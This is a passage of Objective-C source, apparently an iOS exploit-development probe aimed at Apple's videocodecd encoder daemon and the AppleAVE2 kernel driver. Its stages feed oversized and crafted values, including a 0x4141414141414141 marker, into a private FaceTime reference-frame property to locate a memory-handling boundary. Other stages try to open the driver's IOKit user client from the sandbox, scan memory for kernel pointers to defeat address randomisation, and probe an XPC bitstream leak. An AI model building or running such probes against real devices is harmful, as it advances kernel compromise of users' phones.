                    [out appendFormat:@"  raw   NTL=%-5d create=%d\n", ntl, (int)st];
                    continue;
                }
                OSStatus uSt = VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                OSStatus nSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                int pre = -1, post = -1;
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &pre);
                    CFRelease(rb);
                }
                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
                rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &post);
                    CFRelease(rb);
                }
                NSString *encStr = @"deferred-to-sprite";
                if (pb && ntl <= 8) {
                    OSStatus enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    encStr = [NSString stringWithFormat:@"%d", (int)enc];
                }
                [out appendFormat:@"  raw   NTL=%-5d x0=0x%016llx usage=%d set=%d PRE=%d prep=%d POST=%d enc=%@\n",
                 ntl, x0, (int)uSt, (int)nSt, pre, (int)prep, post, encStr];
                VTCompressionSessionInvalidate(s);
                CFRelease(s);
            }
            if (pb) CVPixelBufferRelease(pb);
            return out;
        });
        [report appendString:s2];
    }

    // -------------------------------------------------------------------------
    // Stage 3: UserDPBFramesForFaceTime CFNumber Slot & Cutoff Audit
    // (Strictly CFNumber elements — NSData/NSDictionary trigger uncaught
    // -[_getValue:forType:] SIGABRT in videocodecd -> launchd 320s throttle)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 3: UserDPBFramesForFaceTime CFNumber probe (32..64 boundary)"];
    [report appendString:@"\n--- Stage 3: UserDPBFramesForFaceTime (CFNumber Safe Probe) ---\n"];
    if (vtHung) {
        [report appendString:@"  skipped (videocodecd XPC timed out)\n"];
    } else {
        NSString *s3 = KPH9RunTimed(@"Stage3-DPB", 12000, &vtHung, ^NSString *{
            NSMutableString *out = [NSMutableString string];
            NSMutableArray *cbSink = [NSMutableArray array];
            NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
            VTCompressionSessionRef s = NULL;
            OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                     kCMVideoCodecType_HEVC,
                                                     (__bridge CFDictionaryRef)spec,
                                                     NULL, NULL, KPH9AttsCB,
                                                     (__bridge void *)cbSink, &s);
            if (st != noErr || !s) {
                [out appendFormat:@"  session create -> %d\n", (int)st];
                return out;
            }
            VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            VTCompressionSessionPrepareToEncodeFrames(s);

            CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
            int64_t pts = 0;
            if (pb) {
                @synchronized (cbSink) { [cbSink removeAllObjects]; }
                if (VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid, NULL, NULL, NULL) == noErr) {
                    KPH9Drain(cbSink, 1, 60);
                }
            }

            // Analyst strike 2/3: full 17..32 matrix + exact cutoff 32..64,
            // each row tested on TWO P-frames (DPB matching bites beyond IDR).
            int counts[] = { 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28,
                             29, 30, 31, 32, 33, 34, 48, 63, 64 };
            int nCounts = (int)(sizeof(counts) / sizeof(counts[0]));
            for (int ci = 0; ci < nCounts; ci++) {
                int n = counts[ci];
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
                for (int k = 0; k < n; k++) [arr addObject:@(k)];
                OSStatus sp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
                OSStatus fe = -1, fe2 = -1;
                if (pb) {
                    @synchronized (cbSink) { [cbSink removeAllObjects]; }
                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                    fe = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
                    fe2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
                    if (fe == noErr || fe2 == noErr) KPH9Drain(cbSink, 2, 80);
                }
                NSString *cb = nil;
                @synchronized (cbSink) {
                    cb = cbSink.count ? [cbSink componentsJoinedByString:@" | "] : @"(no cb)";
                }
                [out appendFormat:@"  dpb[num0 x%-2d] set=%d enc=%d/%d cb=%@\n", n, (int)sp, (int)fe, (int)fe2, cb];
            }

            long long vals[] = { 15, 16, 32, -1, 0x4141414141414141LL };
            for (int vi = 0; vi < 5; vi++) {
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:16];
                for (int k = 0; k < 16; k++) [arr addObject:@(vals[vi])];
                OSStatus sp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
                OSStatus fe = -1, fe2 = -1;
                if (pb) {
                    @synchronized (cbSink) { [cbSink removeAllObjects]; }
                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                    fe = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
                    fe2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
                    if (fe == noErr || fe2 == noErr) KPH9Drain(cbSink, 2, 80);
                }
                NSString *cb = nil;
                @synchronized (cbSink) {
                    cb = cbSink.count ? [cbSink componentsJoinedByString:@" | "] : @"(no cb)";
                }
                [out appendFormat:@"  dpb[val=0x%llx x16] set=%d enc=%d/%d cb=%@\n", vals[vi], (int)sp, (int)fe, (int)fe2, cb];
            }

            if (pb) CVPixelBufferRelease(pb);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
            return out;
        });
        [report appendString:s3];
    }

    // -------------------------------------------------------------------------
    // Stage 4: Direct AppleAVE2 IOKit UserClient Check
    // -------------------------------------------------------------------------
    [self journal:@"Stage 4: Direct AppleAVE2 IOKit probe"];
    [report appendString:@"\n--- Stage 4: Direct AppleAVE2 IOKit Probe ---\n"];
    kp_io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2"));
    [report appendFormat:@"  AppleAVE2 service=%u\n", svc];
    if (svc) {
        kp_io_connect_t conn = 0;
        kern_return_t ok = IOServiceOpen(svc, (unsigned int)mach_task_self(), 0, &conn);
        [report appendFormat:@"  IOServiceOpen -> 0x%x (conn=%u)\n", ok, conn];
        if (ok == KERN_SUCCESS && conn) {
            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
    } else {
        [report appendString:@"  AppleAVE2 not exposed to sandbox\n"];
    }

    // -------------------------------------------------------------------------
    // Stage 5: Safe VM / KASLR Candidate Scan (vm_read_overwrite)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 5: Safe VM candidate scan"];
    [report appendString:@"\n--- Stage 5: Safe VM / KASLR Candidate Scan ---\n"];
    vm_address_t addr = 0;
    vm_size_t size = 0;
    uint32_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
    uint64_t pageBuf[512];
    int candidates = 0;
    for (int iter = 0; iter < 160 && candidates < 64; iter++) {
        count = VM_REGION_SUBMAP_INFO_COUNT_64;
        if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                 (vm_region_recurse_info_t)&info, &count) != KERN_SUCCESS || size == 0) {
            break;
        }
        if (info.is_submap) {
            depth++;
            continue;
        }
        if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
            size <= 8 * 1024 * 1024 &&
            !KPVMShouldSkipRegion(&info, addr, size, &depth, NULL, NULL, 0)) {
            vm_size_t maxBytes = (size < 16384) ? size : 16384;
            for (vm_size_t off = 0; off + sizeof(pageBuf) <= maxBytes && candidates < 64; off += sizeof(pageBuf)) {
                vm_size_t outSz = 0;
                if (vm_read_overwrite(mach_task_self(), addr + off, sizeof(pageBuf),
                                      (vm_address_t)pageBuf, &outSz) != KERN_SUCCESS ||
                    outSz < sizeof(uint64_t)) {
                    break;
                }
                size_t words = outSz / sizeof(uint64_t);
                for (size_t w = 0; w < words && candidates < 64; w++) {
                    uint64_t v = pageBuf[w];
                    if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                        candidates++;
                    }
                }
            }
        }
        if (addr + size <= addr) break;
        addr += size;
    }
    [report appendFormat:@"  filtered kernel pointer candidates: %d\n", candidates];

    // -------------------------------------------------------------------------
    // Stage 6: XPC bitstream / NAL / attachments leak + exact DPB boundary
    // -------------------------------------------------------------------------
    [self journal:@"Stage 6: XPC bitstream leak & DPB boundary"];
    if (vtHung) {
        [report appendString:@"\n--- Stage 6 skipped (videocodecd XPC timed out) ---\n"];
    } else {
        NSString *s6 = KPH9RunTimed(@"Stage6-XPC", 15000, &vtHung, ^NSString *{
            NSMutableString *out = [NSMutableString string];
            RunStage6_XPCLeakAndBoundaryAudit(out);
            return out;
        });
        [report appendString:s6];
    }

    // -------------------------------------------------------------------------
    // Stage 7: -17691 malfunction matrix + UserRPS container ladder
    // -------------------------------------------------------------------------
    [self journal:@"Stage 7: -17691 matrix + UserRPS containers"];
    if (vtHung) {
        [report appendString:@"\n--- Stage 7 skipped (videocodecd XPC timed out) ---\n"];
    } else {
        NSString *s7 = KPH9RunTimed(@"Stage7-Matrix", 25000, &vtHung, ^NSString *{
            NSMutableString *out = [NSMutableString string];
            RunStage7_MalfunctionMatrix(out);
            return out;
        });
        [report appendString:s7];
    }

    [report appendFormat:@"\nVERDICT: %@\n", vtHung ? @"VIDEOCODECD_XPC_TIMEOUT (reboot device to clear wedged daemon)" : @"COMPLETED_CLEAN"];

    [self journal:@"=== H9 clean rebuild complete ==="];
    return report;
}

@end
